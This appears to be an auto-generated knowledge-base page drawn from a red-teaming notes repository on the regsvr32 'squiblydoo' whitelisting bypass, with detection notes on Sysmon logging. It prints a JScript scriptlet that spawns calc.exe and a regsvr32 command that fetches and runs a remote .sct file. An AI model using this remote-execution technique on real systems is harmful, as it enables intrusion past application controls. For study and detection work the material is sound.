---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# regsvr32

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-t1117-regsvr32-aka-squiblydoo` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

markup

## Preserved Body

````markdown
## Execution
```markup
<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
    ]]>
</script>
</registration>
</scriptlet>
```
We need to host the back.sct on a web server so we can invoke it like so:
```csharp
regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
```
## Observations

![calc.exe spawned by regsvr32.exe](<../../_assets/regsvr32.png>)

Note how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, the evil process may not be immedialy evident... Not until you realise how it was invoked though. Sysmon commandline logging may help you detect this activity:

![](<../../_assets/regsvr32-commandline (1).png>)

Additionally, of course sysmon will show regsvr32 establishing a network connection:

![](<../../_assets/regsvr32-network.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/regsvr32.md)

## Evidence Excerpt

````text
_asset_filenames:
- regsvr32-commandline (1).png
- regsvr32-network.png
- regsvr32.png
_body: "---\ndescription: regsvr32 (squiblydoo) code execution - bypass application whitelisting.\n---\n\n# regsvr32\n\n##\
\ Execution\n\n{% code title=\"http://10.0.0.5/back.sct\" %}\n```markup\n<?XML version=\"1.0\"?>\n<scriptlet>\n<registration\n\
\  progid=\"TESTING\"\n  classid=\"{A1112221-0000-0000-3000-000DA00DABFC}\" >\n  <script language=\"JScript\">\n    <![CDATA[\n\
\      var foo = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); \n    ]]>\n</script>\n</registration>\n</scriptlet>\n\
````
